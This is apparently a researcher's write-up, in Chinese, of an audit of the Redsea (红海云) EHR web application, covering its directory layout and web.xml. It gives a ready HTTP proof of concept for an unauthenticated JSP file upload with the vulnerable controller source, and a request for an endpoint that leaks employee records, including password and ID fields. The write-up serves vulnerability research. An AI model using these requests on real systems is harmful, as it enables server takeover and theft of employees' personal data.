## 红海云EHR

前天看了一下红海云想审计交通用漏洞计划，没想到直接当晚就超标不收了，这两天挖了一些洞还是写一哈吧

源码就在lework-x.x-SNAPSHOT.war里面

文件目录结构如下

```
├── H5App
├── META-INF
├── UIdemo
├── UIdemo2
├── WEB-INF
├── admin_login.jsp
├── demo
├── dingding
├── dlApp.html
├── downloadfile
├── error
├── forgot
├── index.jsp
├── index_old.jsp
├── jsp
├── login_door.jsp
├── login_moa.jsp
├── login_worktoday.jsp
├── login_zhengzhong.jsp
├── mydb
├── newUI
├── skins
├── templetfordown
├── templetforserver
├── upload
├── validation
├── version
├── worktoday
└── wxappH5
```

```
进入webinf/classes
├── GenZon.properties
├── com
├── conf
├── config.properties
├── demo
├── fieldcontrast.properties
├── font.properties
├── hello
├── log4j.properties
├── log4j2.xml
├── org
├── postemplate
├── push_config.properties
├── red
├── sms.txt
├── timer.properties
├── token.properties
└── uploadfile.properties
```



web.xml如下

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" version="2.5">
  <listener>
    <listener-class>org.springframework.web.context.request.RequestContextListener</listener-class>
  </listener>

  <filter>
    <filter-name>InterceptorConfig</filter-name>
    <filter-class>com.lacesar.sos.secondarycheck.FilterInfoConfig</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>InterceptorConfig</filter-name>
    <url-pattern>/validation/*</url-pattern>
  </filter-mapping>

<!--  sos order audit log -->
  <filter>
    <filter-name>sosWrapperFilter</filter-name>
    <filter-class>com.lacesar.handler.filter.WrapperFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>sosWrapperFilter</filter-name>
    <url-pattern>/sosOrder/draftToOrder.mc</url-pattern>
    <url-pattern>/sosOrder/draftToOrder.mob</url-pattern>
    <url-pattern>/sosOrder/buildDraftSosOrder.mc</url-pattern>
    <url-pattern>/sosOrder/buildDraftSosOrder.mob</url-pattern>
    <url-pattern>/sosOrder/createSosOrder.mc</url-pattern>
    <url-pattern>/sosOrder/createSosOrder.mob</url-pattern>
  </filter-mapping>

  <!--  sos order audit log -->
  <filter>
    <filter-name>GZIPFilter</filter-name>
    <filter-class>com.lacesar.gzip.GZIPFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>GZIPFilter</filter-name>
    <url-pattern>/posManage/releaseMenuInfos.mob</url-pattern>
  </filter-mapping>

  <filter>
    <filter-name>CharacterEncodingFilter</filter-name>
    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
    <init-param>
      <param-name>encoding</param-name>
      <param-value>utf-8</param-value>
    </init-param>
    <init-param>
      <param-name>forceEncoding</param-name>
      <param-value>true</param-value>
    </init-param>
  </filter>
  <filter-mapping>
    <filter-name>CharacterEncodingFilter</filter-name>
    <url-pattern>*.jsp</url-pattern>
    <url-pattern>/j_red_security_check/*</url-pattern>
  </filter-mapping>
  <filter-mapping>
    <filter-name>CharacterEncodingFilter</filter-name>
    <url-pattern>*.mc</url-pattern>
    <url-pattern>*.mob</url-pattern>
    <url-pattern>*.mb</url-pattern>
    <url-pattern>/messageInteface</url-pattern>
  </filter-mapping>
  <context-param>
    <param-name>contextClass</param-name>
    <param-value>
            org.springframework.web.context.support.AnnotationConfigWebApplicationContext
        </param-value>
  </context-param>
  <filter>
    <filter-name>apiFilter</filter-name>
    <filter-class>red.sea.openapi.config.ApiFilter</filter-class>
    <init-param>
      <param-name>openApi</param-name>
      <param-value>true</param-value>
    </init-param>
  </filter>
  <filter-mapping>
    <filter-name>apiFilter</filter-name>
    <url-pattern>/openapi/*</url-pattern>
  </filter-mapping>
  <filter>
    <filter-name>AuthenticationProcessingFilter</filter-name>
    <filter-class>red.sea.platform.permit.login.filter.AuthenticationProcessingFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>AuthenticationProcessingFilter</filter-name>
    <url-pattern>*.mc</url-pattern>
  </filter-mapping>
  <filter>
    <filter-name>H5AppFilter</filter-name>
    <filter-class>red.sea.platform.H5App.filter.H5AppFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>H5AppFilter</filter-name>
    <url-pattern>/H5App/*</url-pattern>
    <url-pattern>/jsp/workFlow/app/*</url-pattern>
    <url-pattern>/dingding/*</url-pattern>
  </filter-mapping>
  <filter>
    <filter-name>DruidWebStatFilter</filter-name>
    <filter-class>com.alibaba.druid.support.http.WebStatFilter</filter-class>
    <init-param>
      <param-name>exclusions</param-name>
      <param-value>*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*</param-value>
    </init-param>
    <init-param>
      <param-name>principalSessionName</param-name>
      <param-value>platform.permit.UserInfo</param-value>
    </init-param>
    <init-param>
      <param-name>profileEnable</param-name>
      <param-value>true</param-value>
    </init-param>
    <init-param>
      <param-name>principalCookieName</param-name>
      <param-value>redseaUserInfo</param-value>
    </init-param>
  </filter>
  <filter-mapping>
    <filter-name>DruidWebStatFilter</filter-name>
    <url-pattern>*.jsp</url-pattern>
    <servlet-name>dispatcherServlet</servlet-name>
    <servlet-name>LoginSession</servlet-name>
    <servlet-name>LogoutServlet</servlet-name>
  </filter-mapping>
  <filter>
    <filter-name>CORSFilter</filter-name>
    <filter-class>com.lacesar.tuitui.box.tool.CORSFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>CORSFilter</filter-name>
    <url-pattern>/ttImageMaterial/*</url-pattern>
  </filter-mapping>
  <listener>
    <listener-class>red.sea.platform.permit.login.SessionListener</listener-class>
  </listener>
  <servlet>
    <servlet-name>dispatcherServlet</servlet-name>
    <servlet-class>
            org.springframework.web.servlet.DispatcherServlet
        </servlet-class>
    <init-param>
      <param-name>contextConfigLocation</param-name>
      <param-value>
                /WEB-INF/springcomm/*.xml
            </param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
  </servlet>
  <servlet>
    <servlet-name>LoginSession</servlet-name>
    <servlet-class>red.sea.platform.permit.login.SessionCreatingServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>LogoutServlet</servlet-name>
    <servlet-class>red.sea.platform.permit.login.LogoutServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>LoadOnStartupServlet</servlet-name>
    <servlet-class>red.sea.jcrontab.timer.web.LoadCrontabServlet</servlet-class>
    <init-param>
      <param-name>PROPERTIES_FILE</param-name>
      <param-value>timer.properties</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
  </servlet>
 
  <servlet>
    <servlet-name>DruidStatView</servlet-name>
    <servlet-class>com.alibaba.druid.support.http.StatViewServlet</servlet-class>
    <init-param>
      <param-name>resetEnable</param-name>
      <param-value>true</param-value>
    </init-param>
  </servlet>
  <servlet-mapping>
    <servlet-name>DruidStatView</servlet-name>
    <url-pattern>/druid/*</url-pattern>
  </servlet-mapping>
 
  <servlet-mapping>
    <servlet-name>LoadOnStartupServlet</servlet-name>
    <url-pattern>/Startup</url-pattern>
  </servlet-mapping>
  <servlet>
    <display-name>OfficeServer</display-name>
    <servlet-name>OfficeServer</servlet-name>
    <servlet-class>red.sea.commons.onlineoffice.servlet.OfficeServer</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>OfficeServer</servlet-name>
    <url-pattern>/OfficeServer</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>LogoutServlet</servlet-name>
    <url-pattern>/Logout/*</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>LoginSession</servlet-name>
    <url-pattern>/j_red_security_check/*</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>dispatcherServlet</servlet-name>
    <url-pattern>*.mc</url-pattern>
    <url-pattern>*.mob</url-pattern>
    <url-pattern>*.mb</url-pattern>
    <url-pattern>/messageInteface</url-pattern>
    <url-pattern>/cdata</url-pattern>
    <url-pattern>/fdata</url-pattern>
    <url-pattern>/devicecmd</url-pattern>
    <url-pattern>/getrequest</url-pattern>
    <url-pattern>/getrequest.none</url-pattern>
    <url-pattern>/token</url-pattern>
    <url-pattern>/ectpdata</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>Websocket-bridge</servlet-name>
    <servlet-class>red.sea.ws.servlet.HttpWs</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>Websocket-bridge</servlet-name>
    <url-pattern>/ws/bridge</url-pattern>
  </servlet-mapping>
  <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
  </welcome-file-list>
  <error-page>
    <error-code>400</error-code>
    <location>/error/400.jsp</location>
  </error-page>
  <error-page>
    <error-code>403</error-code>
    <location>/error/403.jsp</location>
  </error-page>
  <error-page>
    <error-code>404</error-code>
    <location>/error/404.jsp</location>
  </error-page>
  <error-page>
    <error-code>500</error-code>
    <location>/error/500.jsp</location>
  </error-page>
</web-app>
```

访问*mc会被AuthenticationProcessingFilter处理



在之前网上一共公开的有三个洞 文件上传 信息泄漏 还有sql注入，但是由于sql注入找不到了所以就写文件上传和信息泄漏了





### PtFjk文件上传



网上公开的poc

```
POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
Host: your-ip
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4
 
------WebKitFormBoundaryt7WbDl1tXogoZys4
Content-Disposition: form-data; name="fj_file"; filename="11.jsp"
Content-Type:image/jpeg
 
<% out.print("hello,eHR");%>
------WebKitFormBoundaryt7WbDl1tXogoZys4--
```

文件地址在

WEB-INF/classes/red/sea/platform/fjk/controller/PtFjkController.class



源码如下

```
@RequestMapping(
        params = {"method=upload"}
    )
    public String upload(HttpServletRequest request, HttpServletResponse response, @RequestParam("fj_file") MultipartFile[] fj_file, PtFjkView ptFjk) throws IOException {
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();

        try {
            List<PtFjkView> arr = new ArrayList();
            if (fj_file != null && fj_file.length > 0) {
                MultipartFile[] var10 = fj_file;
                int var9 = fj_file.length;

                for(int var8 = 0; var8 < var9; ++var8) {
                    MultipartFile fj = var10[var8];
                    if (fj == null) {
                        out.println("error:未上传文件");
                    } else {
                        int shape = 0;

                        try {
                            ByteArrayInputStream inputStream = new ByteArrayInputStream(fj.getBytes());
                            Throwable var13 = null;

                            try {
                                BufferedImage image = ImageIO.read(inputStream);
                                int width = image.getWidth();
                                int height = image.getHeight();
                                if (width == height) {
                                    shape = 0;
                                } else if (width > height) {
                                    shape = 1;
                                } else {
                                    shape = 2;
                                }
                            } catch (Throwable var32) {
                                var13 = var32;
                                throw var32;
                            } finally {
                                if (inputStream != null) {
                                    if (var13 != null) {
                                        try {
                                            inputStream.close();
                                        } catch (Throwable var31) {
                                            var13.addSuppressed(var31);
                                        }
                                    } else {
                                        inputStream.close();
                                    }
                                }

                            }
                        } catch (IOException var34) {
                            logger.error(var34.getMessage());
                        }

                        ptFjk.setFileName(fj.getOriginalFilename());
                        PtUsers user = GetUserInfo.getPtUsersWithNoException(request);
                        ptFjk.setOperator(user.getUserId());
                        ptFjk.setOperatTime(new Date());
                        Random random = new Random();
                        String qz = Integer.toString(random.nextInt(10000000));
                        final String wjlj = FileUtil.getWjlj(user.getRootId(), fj.getOriginalFilename(), qz + "_" + shape, ptFjk.getOperatTime());
                        long imgSize = fj.getSize();
                        if (isImage(ptFjk.getFileName()) && imgSize > 768000L) {
                            CommonsMultipartFile cf = (CommonsMultipartFile)fj;
                            DiskFileItem fileItem = (DiskFileItem)cf.getFileItem();
                            File imgFile = fileItem.getStoreLocation();
                            wjlj = wjlj.replaceFirst("\\.[^.]+$", ".jpg");
                            File outFile = new File(wjlj);
                            Thumbnails.of(new File[]{imgFile}).scale(1.0).outputQuality(0.84F).outputFormat("jpg").toFile(outFile);
                            if (outFile.length() > 768000L) {
                                Thumbnails.of(new File[]{outFile}).scale(1.0).outputQuality(0.64F).outputFormat("jpg").toFile(outFile);
                            }

                            String fileName = fj.getOriginalFilename();
                            fileName = fileName.replaceFirst("\\.[^.]+$", ".jpg");
                            ptFjk.setFileName(fileName);
                            ptFjk.setFileSize(new BigDecimal(outFile.length()));
                            ptFjk.setFileSuffix(".jpg");
                            ptFjk.setSavePath(FileUtil.sysPath(wjlj));
                            ptFjk.setHerfUrl(FileUtil.getHerfUrl(wjlj));
                        } else {
                            ptFjk.setFileSize(new BigDecimal(imgSize));
                            ptFjk.setFileSuffix(FileUtil.getHouzui(ptFjk.getFileName()));
                            String herfUrl = FileUtil.getHerfUrl(wjlj);
                            ptFjk.setSavePath(FileUtil.sysPath(wjlj));
                            ptFjk.setHerfUrl(herfUrl);

                            try {
                                FileUtil.saveToFile(fj.getInputStream(), wjlj);
                            } catch (Exception var30) {
                                logger.error(var30.getMessage());
                            }

                            String convertPDF = request.getParameter("convertPDF");
                            if ("true".equals(convertPDF)) {
                                final String pdfFilePath = wjlj.substring(0, wjlj.lastIndexOf(46)) + ".pdf";
                                (new Thread(new Runnable() {
                                    public void run() {
                                        try {
                                            Doc2Htmls.office2pdf(wjlj, pdfFilePath);
                                        } catch (Exception var2) {
                                            var2.printStackTrace();
                                        }

                                    }
                                })).start();
                            }
                        }

                        IPtFjkService ptFjkService = (IPtFjkService)BeanTool.getBean("ptFjkService");
                        PtFjkView result = ptFjkService.insertPtFjk(ptFjk);
                        arr.add(result);
                    }
                }
            } else {
                out.println("error:未上传文件");
            }

            if (arr.size() > 1) {
                out.print(arr);
            } else if (arr.size() == 1) {
                out.print(arr.get(0));
            }
        } catch (Exception var35) {
            var35.printStackTrace();
            out.println("error:未上传文件");
        }

        return null;
    }
```

上传后会贴心的返回savePath 直接ip+uploadfile/xxxx/xx/xx/xxxxxx_xxxxxxxxxxx.jsp访问



### ZZHrInfoController信息泄漏

当时我都忘了这个报出来过了还以为挖到信息泄漏了 直到回想起来好像这个有点眼熟🤡

```
GET /RedseaPlatform/ZZHrInfo.mob?method=getHrInfo HTTP/1.1
Host: 
"parent":"x-x-x-x-x","belongUnitId":"x-x-x-x-x","email":"x@163.com","mobileNo":"xxx****xxxx","workPhone":"","struTreeCode":"tech-00001-00022-00006","sex":"F","memo":"","loginName":"XX","USER_PWD":"x","idCard":"4xxxxxxx","birthDay":"1xxx-0x-xx","jionDate":"2xxx-xx-xx","edu":"xx","postName":"x"}]
```

